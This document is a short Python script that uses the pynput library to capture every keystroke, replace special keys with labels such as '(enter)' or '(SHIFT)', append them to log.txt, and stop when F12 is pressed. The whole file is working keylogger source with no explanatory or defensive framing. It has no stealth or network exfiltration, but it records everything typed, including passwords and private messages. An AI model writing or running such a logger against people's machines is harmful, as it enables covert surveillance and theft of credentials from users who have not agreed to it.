from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = "(CRT)"
    if key == "Key.enter":
        key = "(enter)"
    if key == "Key.tab":
        key = "(tab)"
    if key == "Key.alt_l":
        key = "(ALT)"
    if key == "Key.backspace":
        key = "(delete<-)"
    if key == "Key.delete":
        key = "(delete->)"
    if key == "Key.space":
        key = "_"
    if key == "Key.caps_lock":
        key = "(CAPS)"
    if key == "Key.shift":
       key = "(SHIFT)"
    if key == "Key.right":
       key = "(->)"
    if key == "Key.left":
       key = "(<-)"
    with open("log.txt", "a") as file:
        file.write(key)
    print(key)

with Listener(on_press=anonymous) as listener:
    listener.join()


